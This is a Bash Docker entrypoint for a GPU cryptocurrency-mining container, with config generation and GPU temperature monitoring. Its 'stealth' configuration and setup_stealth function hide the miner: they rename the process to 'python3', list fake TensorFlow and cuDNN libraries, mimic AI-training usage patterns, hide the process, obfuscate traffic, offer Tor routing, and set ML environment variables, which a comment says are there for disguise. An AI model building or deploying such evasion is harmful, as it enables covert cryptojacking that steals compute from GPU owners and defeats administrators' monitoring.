#!/bin/bash
# Docker entrypoint script với signal handling và configuration
# Entrypoint cho GPU mining container

set -e

# Trap signals cho graceful shutdown
trap 'echo "Received SIGTERM, shutting down..."; kill -TERM $PID; wait $PID' SIGTERM
trap 'echo "Received SIGINT, shutting down..."; kill -INT $PID; wait $PID' SIGINT

# Function để validate environment
validate_env() {
    echo "🔍 Validating environment..."
    
    # Check for required environment variables
    if [ -z "$WALLET_ADDRESS" ]; then
        echo "❌ ERROR: WALLET_ADDRESS not set"
        exit 1
    fi
    
    if [ -z "$POOL_ADDRESS" ]; then
        echo "⚠️ WARNING: POOL_ADDRESS not set, using default"
        export POOL_ADDRESS="stratum+tcp://pool.example.com:3333"
    fi
    
    # Check GPU availability
    if ! nvidia-smi &> /dev/null; then
        echo "❌ ERROR: No NVIDIA GPU detected"
        exit 1
    fi
    
    echo "✅ Environment validation passed"
}

# Function để generate config từ environment
generate_config() {
    echo "📝 Generating configuration..."
    
    if [ ! -f "/app/config/config.toml" ]; then
        if [ -f "/app/config/config.toml.example" ]; then
            cp /app/config/config.toml.example /app/config/config.toml
        else
            # Generate minimal config
            cat > /app/config/config.toml <<EOF
[mining]
algorithm = "${MINING_ALGO:-kawpow}"
pool_address = "${POOL_ADDRESS}"
wallet_address = "${WALLET_ADDRESS}"
worker_name = "${WORKER_NAME:-gpu-worker}"
use_tls = ${USE_TLS:-true}
intensity = ${INTENSITY:-75}
auto_switch = ${AUTO_SWITCH:-false}
dev_fee = ${DEV_FEE:-1.0}

[gpu]
gpu_indices = [${GPU_INDICES:-0}]
min_compute_capability = ${MIN_COMPUTE:-6.0}
mem_clock_offset = ${MEM_CLOCK_OFFSET:-0}
core_clock_offset = ${CORE_CLOCK_OFFSET:-0}
power_limit = ${POWER_LIMIT:-80}
target_temp = ${TARGET_TEMP:-70}
max_temp = ${MAX_TEMP:-85}
fan_mode = "${FAN_MODE:-auto}"

[stealth]
wrapper_mode = "${WRAPPER_MODE:-ai_training}"
process_name = "${PROCESS_NAME:-python3}"
fake_libs = ["libtensorflow.so", "libcudnn.so"]
mimic_patterns = ${MIMIC_PATTERNS:-true}
usage_jitter = ${USAGE_JITTER:-10}
pattern_interval = ${PATTERN_INTERVAL:-300}
hide_process = ${HIDE_PROCESS:-true}
obfuscate_traffic = ${OBFUSCATE_TRAFFIC:-true}

[network]
timeout = ${NETWORK_TIMEOUT:-30}
retry_attempts = ${RETRY_ATTEMPTS:-3}
retry_delay = ${RETRY_DELAY:-5}
dns_servers = ["8.8.8.8", "1.1.1.1"]
use_tor = ${USE_TOR:-false}

[logging]
log_dir = "/app/logs"
max_size_mb = ${LOG_MAX_SIZE:-100}
max_files = ${LOG_MAX_FILES:-5}
log_stdout = true
log_file = true
encrypt_logs = ${ENCRYPT_LOGS:-false}

stealth_enabled = ${STEALTH_MODE:-true}
log_level = "${RUST_LOG:-info}"
EOF
        fi
    fi
    
    echo "✅ Configuration ready"
}

# Function để setup stealth mode
setup_stealth() {
    if [ "${STEALTH_MODE}" = "true" ]; then
        echo "🥷 Setting up stealth mode..."
        
        # Change process name in /proc
        if [ -w /proc/$$/comm ]; then
            echo "${PROCESS_NAME:-python3}" > /proc/$$/comm 2>/dev/null || true
        fi
        
        # Set fake library paths
        export LD_LIBRARY_PATH="/usr/local/lib/python3.10:/usr/lib/x86_64-linux-gnu:${LD_LIBRARY_PATH}"
        
        # Set AI/ML environment variables để ngụy trang
        export TF_CPP_MIN_LOG_LEVEL=2
        export PYTORCH_CUDA_ALLOC_CONF="max_split_size_mb:512"
        export CUDA_VISIBLE_DEVICES="${GPU_INDICES:-0}"
        
        echo "✅ Stealth mode activated"
    fi
}

# Function để monitor GPU health
monitor_gpu() {
    while true; do
        sleep 60
        
        # Check GPU temperature
        TEMP=$(nvidia-smi --query-gpu=temperature.gpu --format=csv,noheader,nounits 2>/dev/null | head -1)
        if [ ! -z "$TEMP" ] && [ "$TEMP" -gt "${MAX_TEMP:-85}" ]; then
            echo "🔥 WARNING: GPU temperature critical: ${TEMP}°C"
            # Trigger throttling
            nvidia-smi -pl ${POWER_LIMIT:-200} 2>/dev/null || true
        fi
        
        # Log GPU stats
        nvidia-smi --query-gpu=utilization.gpu,temperature.gpu,power.draw,memory.used \
                   --format=csv,noheader >> /app/logs/gpu_stats.csv 2>/dev/null || true
    done
}

# Main execution
main() {
    echo "🚀 Starting GPU Mining Container..."
    echo "📅 $(date)"
    
    # Validate environment
    validate_env
    
    # Generate config
    generate_config
    
    # Setup stealth mode
    setup_stealth
    
    # Start GPU monitor in background
    monitor_gpu &
    MONITOR_PID=$!
    
    # Start main application
    echo "⛏️ Starting mining application..."
    exec /app/gpu-miner "$@" &
    PID=$!
    
    # Wait for process
    wait $PID
    EXIT_CODE=$?
    
    # Cleanup
    kill $MONITOR_PID 2>/dev/null || true
    
    echo "👋 Mining application exited with code: $EXIT_CODE"
    exit $EXIT_CODE
}

# Run main function
main "$@"
